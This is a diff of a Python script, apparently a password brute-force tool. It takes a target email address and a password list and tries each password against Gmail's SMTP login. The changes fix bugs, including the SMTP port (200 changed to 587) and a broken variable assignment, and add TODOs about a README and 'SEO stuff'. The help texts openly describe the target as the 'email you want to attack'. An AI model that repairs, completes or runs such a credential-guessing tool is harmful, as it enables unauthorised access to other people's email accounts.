@@ -2,8 +2,10 @@
 import argparse, smtplib, os, time, sys, random, datetime
 
 # TODOs
+# finish readme
+# finish SEO stuff 
 # test on new Linux, Mac, and Windows machine
-# 
+# add copy paste code comments 
 
 BATCH_ATTEMPTS = 10
 
@@ -14,7 +16,7 @@ BATCH_ATTEMPTS = 10
 def progress(curr, total, suffix=""): 
     bar_length = 100
     filled_length = int(round(bar_length * curr / float(total)))
-    percent = round(100.0 * curr/float(total),1)
+    percent = round(100.0 * curr/float(total), 1)
     bar = ("=" * filled_length ) + ("-" * (bar_length - filled_length))
     sys.stdout.write("[%s] %s%s ...%s\r" %(bar, percent, "%", suffix))
     sys.stdout.flush()
@@ -48,7 +50,8 @@ def attack(target_email, password_list, attack_duration):
     server = smtp()                                                         # halt is here 
     # placeholders
     valid_password = None
-    password_list_index, counter = 0 
+    password_list_index = 0 
+    counter = 0
     print("1") #                                                        TODO does not print 
     # loop thru passwords 
     for password in password_list:
@@ -90,7 +93,7 @@ def attack(target_email, password_list, attack_duration):
 #
 
 def smtp():
-    server = smtplib.SMTP("smtp.gmail.com", 200)
+    server = smtplib.SMTP("smtp.gmail.com", 587)
     server.ehlo()
     server.starttls()
     return server
@@ -107,7 +110,7 @@ def cmd_parse():
     parser.add_argument("target_email", type=str, help="email you want to attack")
     parser.add_argument("password_list", type=str, help="[/path/password_list.txt] Each password should be on a new line")
     parser.add_argument("attack_duration", type=int, help="amount of seconds you want to wait between 8 failed attacks")
-
+    # separate the arguments into a list 
     args = parser.parse_args()
     return args
 
